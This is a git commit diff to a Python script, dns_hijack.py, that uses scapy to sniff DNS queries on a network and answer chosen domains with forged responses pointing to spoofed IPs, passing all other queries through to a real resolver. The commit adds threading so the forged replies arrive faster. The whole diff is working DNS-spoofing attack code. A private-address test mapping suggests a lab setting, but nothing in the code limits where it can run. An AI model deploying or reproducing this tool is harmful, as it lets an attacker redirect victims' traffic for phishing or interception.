a50d578a1b744afb1153983f13dfafcca8cd94b6
George <george.neokq@gmail.com>
2022-06-24 15:49:16 +0800

    perf: Multithread packet handling for faster turnaround time

--- dns_hijack.py
+++ dns_hijack.py
@@ -1,6 +1,7 @@
 from scapy.all import *
 from scapy.layers.dns import *
 from config import MY_IP
+from threading import Thread
 
 TEST_MAPPING = {
   "en.wikipedia.org": "192.168.2.2",
@@ -71,41 +72,44 @@ def intercept_dns(intercept_map: dict):
   print('Mapping:')
   for [domain_name, answer_ip] in intercept_map.items():
     print(f'{domain_name} -> {answer_ip}')
+
+  def thread_handler(packet: Packet):
+    packet.show()
+    original_src: str = packet['IP'].src
+    original_dst: str = packet['IP'].dst
+    dns: DNS = packet['DNS']
+    requested_domain: bytes = dns.qd.qname
+    # Use processed qname field as key for intercept_map
+    requested_domain_str: str = requested_domain.decode('utf8')[:-1]
+
+    # Forward the DNS request to an actual DNS server, then send it back to the requestor
+    if requested_domain_str not in intercept_map:
+      print(f'Domain {requested_domain_str} not in {str(intercept_map)}')
+      dns_response = get_real_dns_response(packet, REACHABLE_DNS_SERVER)
+      if dns_response is not None:
+        print(f'Answering query for {requested_domain_str} with legitimate IP {dns_response["DNSRR"].rdata.decode()}')
+      else:
+        print(f'Unable to contact DNS server {REACHABLE_DNS_SERVER}')
+    else:
+      dns_response = (
+        IP(src=original_dst, dst=original_src) /
+        UDP(sport=53, dport=packet['UDP'].sport) /
+        DNS(
+          id=dns.id,
+          qr=1,
+          ra=1,
+          qd=dns.qd,
+          an=DNSRR(rrname=requested_domain, rdata=intercept_map[requested_domain_str])
+        )
+      )
+      print(f'Answering query for {requested_domain_str} with spoofed IP {intercept_map[requested_domain_str]}')
+
+    if dns_response is not None:
+      send(dns_response)
   
   def intercept(packet: Packet):
     if is_dns_query(packet):
-      packet.show()
-      original_src: str = packet['IP'].src
-      original_dst: str = packet['IP'].dst
-      dns: DNS = packet['DNS']
-      requested_domain: bytes = dns.qd.qname
-      # Use processed qname field as key for intercept_map
-      requested_domain_str: str = requested_domain.decode('utf8')[:-1]
-
-      # Forward the DNS request to an actual DNS server, then send it back to the requestor
-      if requested_domain_str not in intercept_map:
-        print(f'Domain {requested_domain_str} not in {str(intercept_map)}')
-        dns_response = get_real_dns_response(packet, REACHABLE_DNS_SERVER)
-        if dns_response is not None:
-          print(f'Answering query for {requested_domain_str} with legitimate IP {dns_response["DNSRR"].rdata.decode()}')
-        else:
-          print(f'Unable to contact DNS server {REACHABLE_DNS_SERVER}')
-      else:
-        dns_response = (
-          IP(src=original_dst, dst=original_src) /
-          UDP(sport=53, dport=packet['UDP'].sport) /
-          DNS(
-            id=dns.id,
-            qr=1,
-            ra=1,
-            qd=dns.qd,
-            an=DNSRR(rrname=requested_domain, rdata=intercept_map[requested_domain_str])
-          )
-        )
-        print(f'Answering query for {requested_domain_str} with spoofed IP {intercept_map[requested_domain_str]}')
-
-      if dns_response is not None:
-        send(dns_response)
+      Thread(target=thread_handler, args=(packet,)).start()
 
   # Sniff for DNS packets and answer accordingly
   sniff(prn=intercept)
